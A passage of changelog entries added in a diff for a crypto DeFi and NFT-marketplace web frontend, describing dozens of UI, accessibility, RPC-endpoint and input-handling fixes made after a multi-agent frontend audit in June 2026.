+- The activity aggregates counted any priced event, so "Recent Sales" and 24H VOLUME inflated
+  the moment the OpenSea stream connected; they now count `type === "sale"` only. The merged
+  feed is sorted newest-first at both of its merge points, neither of which had sorted at
+  all.
+- `SweepCalculator` hardcoded 30 gwei — **30–300x too high at then-current basefees, reading
+  an estimated ~0.018 ETH against a real ~0.0001** — and now reads live
+  `provider.getFeeData()`, falling back to the 30-gwei default only when there is no provider
+  and labelling that case "rough est.".
+- Three surfaces disagreed on rank tiers (Modal top-25%, ShareCard gold ≤0.5% / blue ≤2.5%,
+  TheaterMode any ranked token). A shared `rankTier(rank, supply)` in `constants.js` adopts
+  ShareCard's scale as the most considered and is used by all three; only the threshold logic
+  converged — each surface keeps its own visual treatment and no badge was removed.
+- A "Diamond Hands" badge granted on whale-count alone, with no hold-duration data behind it,
+  was relabelled "Top Holder"; "{n} never sold" became "{n} with no recent sells" to match the
+  ~50-event window it is computed over; and `WhaleIntelligence` and `CollectionHealth` gained
+  a neutral "Balanced flow" state instead of inventing ACCUMULATING out of a net of zero.
+- Several surfaces stopped reading an API outage as an empty result: `OnChainProfile`,
+  `WhaleIntelligence` and `PortfolioTracker` now detect `fetchWalletNfts`' `{ error }` field
+  and show a retryable error rather than "Observer", "does not hold any" or a confident
+  "0 NFTs", and the holder list carries a "cached example holders" banner when it is fallback
+  data.
+- The depth chart treats a best bid above the floor — a negative spread — as an invalid data
+  state and renders "Data unavailable", never "narrow" or "Healthy".
+
+### Fixed — Skeletons that never terminated, connect walls over public data, and sections that stayed stale until a reload (2026-06-13)
+
+Four plan groups (T5, T7, T8, T11), ten commits, one shared complaint: the interface's
+loading, empty and post-write states did not correspond to what was actually true.
+
+- **The root cause under three separate never-ending skeletons was that the Naka proxy fetch
+  had no timeout at all.** A stalled request — sent, no response — left a promise that never
+  settled, latching the ComparableSales, OFFERS and listings skeletons forever. A 30s request
+  timeout was added at the proxy layer, combined with the caller's abort signal, so every
+  request terminates and a timeout surfaces as a retryable network error. `ComparableSales`
+  also gained an explicit "No comparable sales in the last 90 days" state for when it had
+  tokens to check and found none, instead of silently vanishing, and the Hero SUPPLY stat
+  shimmers while resolving rather than showing a bare em-dash that reads as "no data".
+  `fetchCollectionStats` now de-dupes concurrent in-flight calls for the same collection —
+  Hero, PortfolioTracker, PriceAlerts and OnChainProfile all request it on mount, and the
+  fan-out was tripping the app's own `/api` rate limiter.
+- Grants and Bounties rendered "No proposals/bounties yet" while the count read was still in
+  flight; they now branch on `isLoading` and show the empty copy only once the count resolves
+  to zero. **The page-level `<Suspense>` fallback was dead code**, because static imports
+  never suspend — the four sections were made lazy so the skeleton is live and each is
+  code-split. On a cold reload with wallet auto-reconnect the dashboard flashed the connected
+  skeleton grid and then collapsed to the connect gate; it now gates on
+  `isReconnecting`/`isConnecting` and shows a neutral "Reconnecting your wallet…" during that
+  window.
+- **Whole pages were hidden behind a connect wall over data that needs no wallet.** `/swap`
+  swapped its entire form for a connect wall, which the commit calls the biggest conversion
+  gap — every quote read is public RPC. The form, including the live route, price, impact and
+  min-received, now renders for everyone and only the Approve/Swap button is replaced by a
+  Connect CTA. The same move was applied to Home's lifetime-ETH stat, the Farm stats row,
+  pools grid and boost table, the Dashboard protocol-stats strip and price chart, the
+  NFT-finance and Community tab panels, the Gallery vote tally (gating only the click) and
+  the Naka public bid book (only "manage my bids" stays gated). Loaded-zero was disentangled
+  from loading along the way, so a real zero no longer shimmers forever.
+- **Writes did not refresh their own section.** Post-write refetches were wired across Farm,
+  Dashboard, both lending sections and Community, so a created offer appears in Borrow, an
+  accepted offer leaves the available list and shows under My Loans, a repaid or claimed loan
+  flips state, and a claim drops the card to ~0 within a block instead of waiting on a 30–60s
+  poller. Premature optimistic toasts ("Voting FOR…", "Creating…", "Submitting work…") were
+  replaced by post-confirmation ones, with rejections classified through `surfaceTxError` so a
+  wallet cancel stops reading as "Transaction failed". `LPFarmingSection` now clears the typed
+  amount only on stake/withdraw/exit and not on approve, so an Approve no longer wipes the
+  amount the user is about to stake.
+- **A rejected off-chain signature was overturning a confirmed on-chain fill.** The post-fill
+  backend-notify `signMessage` sat *outside* the best-effort `try` in `acceptTrade`,
+  `acceptOpenTrade` and `fulfillNativeOrder`, so declining that notify signature threw to the
+  outer catch and reported an **already-mined** purchase as "cancelled" — and `ShoppingCart`
+  then dropped the item the user had just bought. The sign now sits inside the `try`, and no
+  on-chain or Seaport execution changed. In the same area, `OfferPanel` called
+  `setLoading(true)` on every 30s tick and flashed skeletons over real offers (it now shows
+  them on first load only and refetches immediately after a successful accept), and a
+  confirmed buy latches the transaction hash and flips the CTA to "Purchased ✓ — View on
+  Etherscan", so a second click cannot re-fire `fulfill` into `OrderAlreadyFilled`.
+- **The price-alert engine was running twice.** `usePriceAlerts` was instantiated always-on at
+  the App level for background monitoring *and* again inside `PriceAlertPanel` when the alerts
+  tab was open — so opening that tab doubled the stats polling and fired every triggered
+  alert's toast and push notification twice against the same `localStorage` state. The
+  App-level instance is now the single engine, passed into the panel as a prop; the panel
+  keeps a local fallback for any standalone render but runs it inert, adding no poller and
+  firing no alerts. Five other interval-driven fetches were gated on `document.hidden` — the
+  GeckoTerminal price fallback (which had been frozen at page load for the whole session while
+  the native pair is unseeded, and now refreshes every 60s), the per-page collection stats and
+  activity poller, the 30s smart-alerts loop, the 30s whale-intelligence poller, and the
+  BidManager auto-refresh, **which fires roughly 21 OpenSea proxy calls per tick on the
+  Received Offers tab.** Only the interval callback skips; the on-mount fetch still runs.
+
+### Added — Keyboard and screen-reader access to tab bars, dialogs, charts and the splash screen (2026-06-13)
+
+Three commits under plan group T10, built around shared primitives rather than per-host
+patches.
+
+- **`src/hooks/useTabListKeys.ts`** adds the missing roving tabindex and Arrow/Home/End
+  navigation to the app's existing `role=tablist`/`role=tab` markup **without** restructuring
+  the bespoke framer-motion `layoutId` indicators each host wires by hand; the pure index
+  maths (`nextTabIndex`) is unit-tested. It was adopted at every main-app tab bar — Trade
+  (which was also carrying an invalid `aria-pressed` on `role=tab`), Activity, Learn,
+  Community, Dashboard, the NFT-finance Lending page and the three inner section tab bars.
+  Trade, Community, Dashboard and Lending gained `id`/`aria-controls`/`aria-labelledby`
+  pairing on their panels; Activity and Learn had their Suspense content wrapped in
+  `role=tabpanel`; the inner section bars took the roving-keyboard half only. The
+  sort-header, offer-row, quantity-stepper and TraitEditor pieces were explicitly deferred.
+- **`src/nakamigos/lib/trapFocus.js`** replaced a ~12-line inline trap that had been
+  copy-pasted into Modal, ShareCard, WalletModal and KeyboardHelp — **none of which filtered
+  `:disabled` controls, so Tab could escape the dialog while, for example, Buy was disabled
+  mid-purchase.** `usePrefersReducedMotion` became the single `matchMedia` gate for the
+  imperative and looping motion layers, and `<MotionConfig reducedMotion="user">` wraps the
+  Nakamigos tree so framer entrances follow the OS preference. `TheaterMode` gained
+  `role=dialog`/`aria-modal`, focus on the close button at mount and restore on close, and
+  the shared trap.
+- **The splash screen could only be entered by clicking a non-focusable div** — no keyboard or
+  switch-access path existed at all. Its root is now a focusable `role="button"` with an
+  Enter/Space handler and autofocus the moment the phase becomes ready, with a visible "OR
+  PRESS ENTER TO SKIP" hint, and click/key skip works from second zero. A dead
+  `.splash-screen { display: none }` reduced-motion CSS rule was deleted: the splash never
+  renders that class, but had it done so the rule would have hidden the only element whose
+  click enters the app, soft-locking reduced-motion users. `AppLoader` gained a visible,
+  labelled "Skip intro" button about 2s in, reusing the existing dissolve phase. No art was
+  removed.
+- The residual gaps closed on re-verification: the launchpad `TraitEditor` declared
+  `role=dialog`/`aria-modal` but never trapped Tab or restored focus, so a shared
+  `useFocusTrap` was extracted from `ui/Modal`'s proven logic and adopted there;
+  `ArtLightbox` restores focus to the opening gallery card, preloads its neighbours and takes
+  horizontal swipes, with focus management keyed only on open/close so Prev/Next no longer
+  steals focus mid-navigation; the DCA slippage help moved off a desktop-hover-only `title=`
+  attribute to a tap-and-keyboard `InfoTooltip`; the StakingCard Claimable value became
+  `aria-live=polite`; the whale expanded-holder panel collapses on Escape; and the two
+  mouse-only canvases — the Deals scatter and the depth chart — gained `role=img` with an
+  `aria-label`/`aria-describedby` summary plus a visually-hidden data table.
+
+### Changed — The rest of the g01–g14 surface remediation: twenty-seven commits of copy, layout, state and read-gating fixes (2026-06-13)
+
+The plan's fourteen surface groups produced a long tail that is individually small and
+collectively the bulk of the day. Enumerated rather than summarised, so the window stays
+legible:
+
+- **g01 shell/nav/splash.** Share links pointed at `tegridyfarms.io` and `tegridy.farm` —
+  neither owned by the project, the latter DNS-dead — **so every shared referral link
+  404'd**; both now use a canonical `SITE_URL` constant. `sanitize()` stopped
+  HTML-entity-encoding values that React already escapes as JSX text nodes, where the
+  encoding had only ever corrupted display ("Randy's Pool" rendering its apostrophe as an
+  entity); it is now identity plus a length cap, with the tx-hash validator unchanged.
+  `ScrollToTop` skips the reset on POP so Back and Forward restore the reading position, and
+  honours `#section` deep links. The 404 page stopped canonicalizing its own bogus path (a
+  soft 404) and emits `robots noindex`, with normal pages proactively clearing any lingering
+  one, and gained Farm/Trade/Dashboard quick links. `usePageTitle` resets meta, OG and
+  Twitter descriptions to the index default rather than leaving the previous route's. Raw
+  `localStorage` reads went through `safeGetItem` so a blocked-site-data `SecurityError`
+  cannot crash the render path. The sitemap was regenerated (redirect-only `/lending`
+  dropped, `/nakamigos` added), two unused splash-art preloads removed, and
+  `apple-mobile-web-app-status-bar-style` plus a `<noscript>` fallback added. Light-theme
+  legibility was fixed in two places: dead light-mode footer overrides were painting deep
+  purple on near-black at about **1.5:1**, and the light header is Kenny orange rather than
+  cream, so nav links and the theme glyph were scoped to near-black for about 9:1. The
+  reserved bottom-nav band was aligned to end at 639px to match `BottomNav`'s `sm:hidden`,
+  killing ~80px of dead padding at 640–767px. A visually-hidden `aria-live` region announces
+  route changes, `<main>` took `tabIndex={-1}` so the skip link reliably moves focus, and the
+  first-visit onboarding modal is gated on splash completion so pressing Escape on the splash
+  no longer silently marks onboarding as seen.
+- **g02 home.** An LCP preload for the actual hero image at high priority with
+  `fetchPriority="high"` on the hero image component; the rotating Towelie quote's `aria-live`
+  removed (it was announcing a joke to screen readers every 7 seconds) and its rotation paused
+  in hidden tabs and under reduced motion; the yield-calculator lock tiers moved off a
+  `role=radiogroup` pattern that promised arrow-key navigation nobody had implemented, onto
+  `aria-pressed` toggles in a `role=group`; a deduplicated "N original pieces" count, since a
+  few works ship in two file formats and every file stays in the gallery. Additive
+  affordances: a USD-primary TVL pill, a real 24h change badge computed first-vs-last of the
+  24h sparkline series rather than the session delta, a contract-address strip with
+  Etherscan and GeckoTerminal links, a FAQ teaser panel funnelling to a route that already
+  existed but was never linked, social links in the trust row, `?ref=` capture carried to
+  `/swap`, and a share affordance for disconnected visitors.
+- **g03 farm/dashboard.** Every read in `usePoolData`/`useUserPosition`/`useRestaking`/
+  `usePoints` chain-pinned and gated on the canonical chain, **so a wrong-chain wallet with a
+  real position stops reading another chain and rendering an empty stake form**; the
+  `useRevenueStats` multicall pinned too; LP reward rates zeroed once `periodFinish` has
+  lapsed, matching `earned()`'s own clamping, so the UI never advertises a dead emission
+  schedule; `useMyLoans` driven by a real refresh nonce, the previous no-op identity
+  `setState` having never re-scanned, plus a 60s status tick so overdue flips live. On the
+  component side every farm write is tagged with a `ReceiptType` and the receipt and confetti
+  skipped when untagged — **no more fake stake receipt on an approve** — and claim and
+  unstake amounts are snapshotted at submit so a mid-flight poll cannot show "claimed 0".
+  `safeParseEther` in the FarmPage render path so Max and a dust balance cannot blank the page
+  through the ErrorBoundary; `LivePoolCard`'s badge derived from data (LIVE once TVL > 0)
+  instead of a hardcoded "HOT" on an empty pool; `LOCK_OPTIONS` extracted to `constants.ts` as
+  a single source. `tsc` clean with 611 hook/lib/component tests green.
+- **g04 trade.** The aggregator's `amountOut` arrives in **wei** and was entering the
+  route-savings maths and the route-detail rows unnormalized, putting `+4.6e+21%` and
+  `3.5e+25` on screen; it is normalized to token units everywhere, degenerate-low venues
+  (the near-empty native pool) excluded from the savings denominator by median with a "low
+  liquidity" badge, and the route count derived from renderable rows rather than quoted
+  venues. The user's slippage is now forwarded to aggregator quote requests, where it had
+  been `undefined`; price impact is derived from the executing on-chain route's own output
+  and clamped favourable to zero; custom-token import is refused on the wrong chain with the
+  modal's reads pinned to `CHAIN_ID`; `useAddLiquidity` reads are chain-gated behind a
+  wrong-network banner instead of a misleading "No pool exists"; MEV status persists per
+  wallet; the Max ETH cap is enforced on the DCA and Alerts inputs; and flipping direction
+  carries the entered amount across, as Uniswap does. None of it touched transaction
+  construction, the approval spender or the execution venue.
+- **g05 nftfinance and launchpad.** Claim Collateral now requires `defaulted === true` and
+  shows a disabled grace badge while overdue-but-in-grace, **where the claim would revert**;
+  Repay and `getRepaymentAmount` stay live through that window in NFT Lending, mirroring
+  Token Lending; a stale or unavailable TOWELI price renders "price unavailable" for Position
+  Value and suppresses the LTV number and bar instead of showing zero; `enabled` gates were
+  added to the `protocolFeeBps`/`offerCount`/`loanCount` reads so they stop `eth_call`-ing
+  the zeroed lending address in a loop; create-offer `parseEther` calls routed through
+  `safeParseEther`; the lender earnings preview netted by the on-chain protocol fee and the
+  P&L figures flagged as full-term estimates; and a text-black find/replace regression that
+  had made emerald status tokens unreadable on dark surfaces was reverted. A pool that fails
+  `getPoolInfo` — for instance one tracked against a dead pre-relaunch factory — renders a
+  terminal "Pool unreachable" card rather than pulsing a skeleton forever; the auto-track
+  guard is keyed on the deploy receipt's txHash so a second pool in the same session re-arms;
+  and the expanded trade-history `getLogs` pair is gated behind a >25-block delta so the
+  10k-block scan does not re-run on every block. On the launchpad, the admin panel's post-tx
+  refetch was called in the render body and **looped refetch → render → refetch**; the
+  wizard's 500ms mount-time auto-save clobbered a stored draft with `initialState` before the
+  user could click Resume, and is now behind a dirty flag with a unit test; the Step 5
+  `DEPLOY_SUCCESS` dispatch moved into a `useEffect` with `maxSupply >= 1` and
+  `maxPerWallet <= maxSupply` validated before Deploy is enabled; and `PhaseBadge` derives
+  from `PHASE_LABELS`, so a live Dutch auction reads "Dutch Auction" and CLOSED/CANCELLED
+  read distinctly, where everything had read "Paused".
+- **g06 community/gallery.** Bounty creation guards `parseEther` in try/catch and rejects
+  zero or negative deadlines behind a derived `canCreate` flag with inline errors; the bounty
+  row header became a `div role="button"` so the "show more" control is no longer a nested
+  `<button>`; gauge rows resolve human pair labels ("TOWELI / WETH") at all three display
+  sites; the "per epoch" stat derives its day count from the on-chain `EPOCH_DURATION`
+  instead of hardcoding seven; claimables format with each token's real decimals and symbol;
+  the pending-fee banner no longer hides a queued cut to 0%; and legacy `/bounties` and
+  `/bribes` redirects carry `?section=` so they land on the right tab.
+- **g07 learn/activity/info.** Explorer links pinned to the canonical chain, since transaction
+  data is mainnet-only and a wallet on Base or Arbitrum was being handed dead basescan and
+  arbiscan links; the Admin premium card gated on `isDeployed()` so it shows a clean pending
+  state rather than perpetual "…" reads and a zero-address Etherscan link; the History page
+  finished its `lib/txHistory` extraction and deleted the diverging inline copies; live LP
+  Farming and the native router and LP added to the tracked-contract filter **so the footer's
+  "all protocol contracts" claim actually holds**; a manual skip-cache Refresh added with its
+  AbortController tied to component lifecycle; the Treasury "as of block" caption polled on
+  the 60s data cadence instead of holding a per-block watch subscription; and Premium plan
+  discounts the `PremiumAccess` contract never implements zeroed, so the displayed total
+  equals the actual on-chain charge. Also: the Tokenomics contract badge derived from
+  `isDeployed()` only, the seed Funded/Remaining figures shown to one decimal because the
+  compact format was truncating about 410k tokens, invalid DOM nesting fixed on the Lore
+  timeline, the All Badges scrim raised with a lock icon replacing double-dimmed illegible
+  text, and the Info 5-tab bar made horizontally scrollable below 380px instead of clipping.
+- **g08 shared lib and hooks.** `useSwap`'s success effect handles each confirmed hash once,
+  killing duplicate "Swap confirmed" toasts, a phantom swap toast after a plain approve, and
+  inflated `trackSwap` analytics; `refreshQuote` now actually re-fetches the aggregator leg,
+  because the ref bump it used never re-ran the effect, and stamps `quoteFetchedAt` so the
+  staleness window resets; `surfaceTxError` was swept into seven money-path hooks so a wallet
+  cancellation reads a soft "Cancelled" rather than a raw "Transaction failed";
+  `useAddLiquidity`'s reset timers are cleaned up on unmount and `useFarmActions.stake()`
+  soft-fails on an invalid amount instead of throwing on the onClick path into the
+  ErrorBoundary; `usePriceAlerts` fires notifications after the state updater so StrictMode
+  cannot double-fire, and drops an inaccurate "per wallet" cap description (alerts are
+  device-global). In lib: `aggregator.normalizeTokenAddress('zero')` returns the zero address
+  rather than the `0xEeee` sentinel, **which had been making Odos drop every native-ETH
+  quote**; `IPFS_GATEWAYS` leads with the live `ipfs.io` because the Cloudflare gateway was
+  sunset in 2024, with cloudflare retained as a harmless tail; `errorReporting.flush()`
+  persists its batch on a 4xx/5xx response, since `fetch` only rejects on network error and
+  `res.ok` was never checked; `analytics.getSessionId` is crash-safe at import with a capped
+  re-queue; `formatCurrency`/`formatNumber` handle the sign once so negatives render as
+  `-$12.34` and grouped `-5,000`; and `categorizeTx` guards every zeroed-contract comparison
+  with `isDeployed()` so a transaction to the zero address stops mislabelling as "Restake".
+  510 lib and hook tests green.
+- **g09 responsive.** Text-shadow scrims behind white-on-art subtitles and H1s on FAQ,
+  Tokenomics, Trade and NFT-finance; sticky sub-nav pill opacity raised 0.72 → 0.92 on Info,
+  Activity and Learn so underlying headings and footer links stop ghosting through; the
+  Dashboard disconnected state moved to the shared dark-card `ConnectPrompt`, the bare
+  text-centre block having dissolved into the camo art at 820px and up; `/premium` self-heals
+  to the live Points tab while the Gold Card is not live, and the tab reappears automatically
+  when the flag flips; a right-edge fade mask on the mobile NFT-finance chip row; and a
+  low-opacity scrim over the Leaderboard art so painted speech captions stop reading as
+  broken UI text. The commit records the owner mandate honoured: additive only, no art,
+  sections or copy removed.
+- **g10–g14 Tradermigos shell, browse, market, analytics and UX.** The ErrorBoundary's "Go
+  Home" and the NotFound fallback wrote `window.location.hash`, which under BrowserRouter
+  does not change the pathname — **so a deterministically crashing tab re-rendered, re-caught
+  and trapped the user with no escape**; both now hard-navigate with `window.location.href`,
+  and the raw stack trace is shown only under `import.meta.env.DEV`. `parseRoute` uses a
+  strict `/^\d{1,10}$/` for `/nft/:id` segments, so `/nft/12abc` no longer resolves to token
+  12; closing a deep-linked modal navigates to the explicit `/:collection/gallery` segment so
+  the tab underneath stays on Gallery; and `InstallPrompt` clears `deferredPrompt` regardless
+  of outcome inside try/catch, so a second Install click after a dismissed native prompt no
+  longer throws an uncaught `InvalidStateError`. In browse: listing prices are merged onto
+  gallery tokens so the price-range filter, price sort and card price badge work at all;
+  trait rarity percentages divide by the loaded sample rather than full supply, with a `~`
+  marker and an "of N loaded" count; the column `ResizeObserver` is re-attached when the
+  scroll container mounts, having been frozen at four columns on mobile; auto-load is gated
+  after a fetch failure and cleared only on explicit Retry; a known-404 metadata image path is
+  no longer emitted; and the `?token=` splash race that stripped the parameter before it was
+  consumed was closed. `App.css` is bundled globally from `main.tsx`, **so its unscoped rules
+  — `*:focus-visible`, the `<details>` marker hide, the 768px touch-target rule, the
+  forced-colors button rule — were leaking into the whole Tegriddy app** and were scoped to
+  `.nakamigos-app`; reduced motion no longer freezes the spinner into a static arc but pulses
+  opacity; toasts lift above the mobile bottom nav, as does the back-to-top button; and a
+  minimal scoped print block was added. Toasts pause their countdown on hover or focus and
+  give errors a 7s window against 3.5s for successes; `useSound` pre-warms the AudioContext on
+  the first gesture so the first alert chirp is not dropped by autoplay policy; `TheaterMode`
+  and `ShareCard` use the ref-counted `lockScroll`/`unlockScroll` so closing one over a still-
+  open Modal does not unlock the body behind it; ShareCard's footer prints the real
+  `window.location.host` rather than a pseudo-domain; `formatPrice` gained a `<0.0001` dust
+  floor, routed through the Modal price box, last sale, Buy label, fair value, the chart
+  min/avg/max and the About floor; `csv.js` quotes bare `\r` values and unions keys across
+  all rows so heterogeneous rows stop dropping columns; and `lib/shortcuts.js` became the
+  single source for the keyboard help, dropping phantom `1-9`/`0` and `F`/`T` entries that
+  were never bound. In alerts and analytics: the smart-alerts config's "Normal rate" setting
+  was dead and is now read; quiet hours suppress only the toast and push while the alert is
+  still appended to history so it is recoverable; price-alert notifications go through the
+  service worker rather than a bare `new Notification()`, **which throws on Android Chrome**;
+  `ActivityFeed` rows are keyed by hash and tokenId rather than array index; the
+  `useActivityWebSocket` block cursor advances only after a successful `fetchTransferLogs` so
+  a failed `eth_getLogs` range is retried; BidManager filters cancelled, finalized and
+  expired offers so dead ones stop showing Accept; `TradesPanel` renders an error banner and
+  Retry on an `/api/orderbook` outage instead of "No active trades"; the BulkListingWizard's
+  ladder inputs were relabelled "Rarest item price" / "Most common item price" with swapped
+  placeholders **so the rarest token is no longer implicitly listed cheapest**; and the cart
+  key was normalized to `id ?? tokenId` with the RaritySniper payload enriched, so sniper
+  items dedupe, render and survive the sweep match. Onboarding was re-keyed once per
+  marketplace rather than per collection, the tour's Gallery step given a real anchor, and the
+  tour made replayable from KeyboardHelp; nav tabs gained `aria-current="page"`, the More
+  dropdown `role=menu` semantics, Escape-to-close and reposition-on-scroll, and lazy-chunk
+  prefetch on hover or focus; and clicking your own connected address now opens an account
+  popover instead of instantly disconnecting on a misclick.
+
+### Internal — A 27-agent frontend audit found 690 defects, and the plan that sequenced them was committed as code (2026-06-13)
+
+`38a647e4`. The reports and the plan had been living untracked in the working tree; the commit message gives the reason for committing them as-is — so a concurrent tree-clean could not wipe them. **Almost every entry dated 2026-06-13 below carries this plan's `Fnnn` identifiers and batch names in its own commit body** — though the docs themselves landed at 06:01, after `9a463f00` (05:53) and `0c8b3d22` (05:57) had already shipped against them, and `1ba262b1` is the one commit that day citing neither an `Fnnn` nor a batch.
+
+The audit ran three ways over both apps — in the reports' own words, live Chrome at 3432px, exact-viewport Playwright at 390/820/1440px, and code-read at HEAD of `mvp-launch`. Re-counting the raw
+[`frontend/AUDIT_FINDINGS_CONSOLIDATED.json`](frontend/AUDIT_FINDINGS_CONSOLIDATED.json) today gives **690 findings across 27 agent files**, matching the commit's own number. Synthesized into
+[`AUDIT_REPORT_MAIN.md`](frontend/AUDIT_REPORT_MAIN.md) (18 agents), [`AUDIT_REPORT_NAKA.md`](frontend/AUDIT_REPORT_NAKA.md) (10) and [`AUDIT_REPORT_CROSS.md`](frontend/AUDIT_REPORT_CROSS.md).
+
+[`frontend/REMEDIATION_PLAN.md`](frontend/REMEDIATION_PLAN.md) sequences **838 items** out of the 14 per-surface planners (`frontend/plan/g01…g14.md`) and classifies each one. It indexes more items than the audit found defects because each agent filed a *missing-vs-best-in-class* list alongside its findings: re-counting today gives 690 findings plus **151** such items — 841 — routed into the planners, which is exactly the total in [`frontend/plan_input/_manifest.json`](frontend/plan_input/_manifest.json). Re-read today, the verdict table stands at **625 `fix-now`, 121 `product-decision`, 57 `duplicate`, 16 `redeploy-only`, 14 `operator-action`, 5 `false-positive`.**
+
+Two structural decisions in the plan are worth keeping, because everything that follows obeys them:
+
+- **Twelve recurring themes (T1–T12) were fixed once as shared helpers rather than per surface.** The plan's own cluster arithmetic puts the T-theme work-items as carrying the shared logic for roughly 250 of the 625 `fix-now` findings; a per-surface batch then only carries the residue.
+- **The owner mandate the whole wave ran under: every fix additive — no art asset and no page section removed.** The plan states it in its own header, and several commits below restate it — `47e3dc98` signs off "additive only — no art, sections, or copy removed" over a batch whose fixes are scrims placed *over* background art.
+
+### Fixed — Three of the four public RPC endpoints were dead, and the roster changed hands four times before a live probe settled it (2026-06-13)
+
+Five commits in one day. Kept in the order they actually landed, because **the order is the finding**.
+
+- **07:17 — `47bed0f6`.** wagmi's bare `http()` default resolves to `eth.merkle.io`, which was **not in the production CSP `connect-src` allowlist** — so every fall-through to it hard-blocked and spammed the console. The commit records 200+ errors per 30s on heavy routes; [`frontend/AUDIT_REPORT_MAIN.md`](frontend/AUDIT_REPORT_MAIN.md) puts it at up to 209 in 30s, measured on the portfolio route. Replaced with `https://cloudflare-eth.com`, already allowlisted, so no infrastructure or CSP change was needed.
+- **07:33 — `d232cdb4`** dropped llamarpc from the wagmi fallback entirely — its origin sends no `Access-Control-Allow-Origin`, so every fall-through failed CORS preflight with `net::ERR_FAILED` and **masked real failures behind console noise**. That left publicnode, ankr and cloudflare-eth standing. The same commit fixed an unrelated proxy defect: the OpenSea allowlist accepted only the singular `collection/{slug}/stats` while the client calls the canonical plural `collections/{slug}/stats` (OpenSea v2), so **the proxy 400'd before ever reaching OpenSea and the hub stat tiles sat as skeletons forever.** Both prefixes are now allowlisted, with the singular kept for back-compat.
+- **07:55 — `1ba262b1`** found that both Tradermigos on-chain surfaces (`OnChainProfile`, `WhaleIntelligence`) hard-coded `eth.llamarpc.com` as their **only** ethers provider, so both broke entirely when llamarpc returned 503/521 in production on 2026-06-11. Both now route through a shared `getReadProvider()` FallbackProvider (`quorum: 1`) over the same endpoint list wagmi uses ([`frontend/src/nakamigos/lib/rpcProvider.js`](frontend/src/nakamigos/lib/rpcProvider.js)). Probing the roster while doing it found **three of the four configured public RPCs dead**: ankr (keyless access now requires a key), cloudflare-eth (recorded in that commit as a sunset gateway), and llamarpc (521, no CORS header). It replaced them with `eth.drpc.org` and **`eth.merkle.io` — the endpoint pruned 38 minutes earlier for being CSP-blocked** — and the `frontend/vercel.json` diff shows the allowlist widened to admit merkle.io in the same edit that removed ankr and cloudflare-eth from it.
+- **11:57 — `3c164d49`** corrects `1ba262b1` and `d232cdb4`. Re-verified live by `curl`ing `eth_chainId` with an Origin header: publicnode, drpc **and cloudflare-eth** all return `0x1` with `access-control-allow-origin: *` — **cloudflare-eth was not sunset** — while `merkle.io` returns Cloudflare error 1015 with no ACAO header at all, and ankr now returns `-32000 Unauthorized`. Both browser RPC consumers (the wagmi viem transports and the nakamigos ethers helper) and the `connect-src` allowlist were set to exactly those three endpoints; the diff shows llamarpc and merkle.io leaving it and cloudflare-eth returning.
+- **13:16 — `cfaff0e7`** finished it on the server side, aligning the `seaport-verify` RPC fallback to the same live-verified roster, cloudflare-eth in place of the errored merkle.io.
+
+**Two beliefs about an endpoint were taken from documentation and both failed a probe four hours later:** cloudflare-eth was dropped as a sunset gateway and was answering normally, and merkle.io was promoted as a "verified-live, CORS-clean" backup — with the CSP widened for it — while it was in fact returning Cloudflare 1015 behind no CORS header at all.
+
+### Fixed — Two modals that never finished fading in, a crash the user could not escape, and an input that read 1e5 as 15 (2026-06-13)
+
+The P0 batch: defects that either blank a surface or silently change a number the user typed.
+
+- **Frozen entrance tweens** (`9a463f00`). The Gallery lightbox's inner content wrapper and the Swap `TokenSelectModal` card both mounted with `initial={{ opacity: 0 }}` and an `animate` target that **omitted `opacity: 1`**, so under `LazyMotion` + `domAnimation` the tween froze mid-fade and the content never became visible. One property added to each target; verified live on the dev server. The commit is explicit that a third symptom is *not* this bug — the Liquidity/DCA/Alerts panes ghosting over art have a computed opacity of 1 and were reclassified as a legibility problem over the late-loading mural.
+- **An inescapable crash loop** (`359869ef`). The Tradermigos `ErrorBoundary`'s "Go Home" button and the `NotFound` fallback both wrote `window.location.hash`. **Under `BrowserRouter` a hash write does not change the pathname**, so a deterministically crashing tab re-rendered, re-caught, and trapped the user with no exit. Both now hard-navigate via `window.location.href`, which guarantees a full document load. Same commit: the raw stack trace shows only under `import.meta.env.DEV`; closing a `/nft/` deep-linked modal returns to the explicit `/:collection/gallery` segment instead of bouncing the tab to Floor; `InstallPrompt` clears `deferredPrompt` regardless of `prompt()` outcome and wraps it in try/catch, so a second Install click after dismissing the native prompt no longer throws an uncaught `InvalidStateError`; and `/nft/:id` parsing became a strict `/^\d{1,10}$/` test, so **`/nft/12abc` no longer resolves to token 12.**
+- **A price field that crashed the offer modal** (`08d3ee20`). `MakeOfferModal` fed `e.target.value` straight into state, and two render-path IIFEs then ran `BigInt(whole)` after `price.split('.')`. Typing or pasting `1e-8` made `BigInt('1e-8')` throw; a leading-dot `.5` made `BigInt('')` throw — **either blanked the modal through the ErrorBoundary.** Reuses the main app's `sanitizeDecimalInput` and guards both conversions with `BigInt(whole || '0')`.
+- **`1e5` silently became `15`** (`1a7335a4`). The staking and LP amount inputs were `type=number` with a `replace(/[^0-9.]/g, '')` strip that **deletes the `e` from `1e5` and concatenates the remainder.** Replaced by a shared `sanitizeDecimalInput()` that terminates at scientific notation (`1e5` → `1`, visibly wrong rather than silently wrong), on `type=text inputMode=decimal` for full control, across `StakingCard` and both `LPFarmingSection` inputs. Also in that commit: `ReferralWidget` had one shared `copied` boolean behind two copy buttons, so clicking either flipped both to "Copied!".
+- **Every live deadline read "Ends just now"** (`cfd59836`). Grants and Bounties rendered deadlines as `formatTimeAgo(deadline).replace(' ago', ' left')`. For a *future* timestamp `formatTimeAgo` computes negative elapsed and returns "just now" — a string containing no " ago", so the replace never matched and **every live proposal and bounty displayed the same meaningless deadline.** A dedicated `formatTimeUntil` ("5d left" / "3h left" / "<1m left" / "Ended") now backs both call sites.
+- **Three P0 quick-wins verified live** (`0c8b3d22`). Home overflowed horizontally on iPhone — **414px of content on a 390px device** — because the hero readability scrim uses negative `-left-6`/`-right-10` insets that extend past the viewport; `overflow-x-clip` on the page root stops the decorative scrim widening the layout (fixed and sticky elements ignore ancestor overflow, so the background and nav are unaffected). The "Protocol Active" price pill sat underneath the Towelie mascot — both `fixed bottom-4 right-4`, mascot at `z-60` over pill at `z-40` — and moved to `right-24` on md+ with no mobile impact. And `<MotionConfig reducedMotion="user">` now wraps the `LazyMotion` tree, so **every `m.*` animation honours the OS reduced-motion setting app-wide** without per-component handling.
+
+### Fixed — Swap quotes leaked raw wei, the pool's own age was 15 months wrong, and a log scan asked for 7 million blocks (2026-06-13)
+
